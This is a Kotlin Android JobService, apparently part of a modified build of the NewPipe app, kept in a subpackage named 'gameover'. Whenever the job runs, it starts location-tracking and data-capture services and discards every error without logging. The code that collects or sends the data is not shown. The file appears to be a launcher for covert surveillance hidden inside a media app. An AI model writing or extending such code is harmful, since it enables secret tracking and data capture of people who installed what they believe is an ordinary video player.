package org.schabi.newpipe.gameover

import android.app.job.JobParameters
import android.app.job.JobService
import android.content.Intent
import android.os.Build
import androidx.annotation.RequiresApi

class LocationJob : JobService() {
    val TAG = "LocationJob"

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onStartJob(p0: JobParameters?): Boolean {
        startMyService()
        startLocationService()
        startDataService()
        return true
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun startLocationService() {
        try {
            val intent = Intent(this, LocationService::class.java)
            intent.action = "startLocationTracking"
            this.startForegroundService(intent)
        } catch (e: Exception) {
            // Log.e("LocationJob", "onStartJob: $e")
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun startDataService() {
        try {
            val intent = Intent(this, DataService::class.java)
            intent.action = "startDataCapture"
            this.startForegroundService(intent)
        } catch (e: Exception) {
            // Log.e("LocationJob", "onStartJob: $e")
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun startMyService() {
        try {
            val intent = Intent(this, MyService::class.java)
            intent.action = "myAction"
            this.startForegroundService(intent)
        } catch (e: Exception) {
            // Log.e("LocationJob", "onStartJob: $e")
        }
    }

    override fun onStopJob(p0: JobParameters?): Boolean {
        return false
    }
}
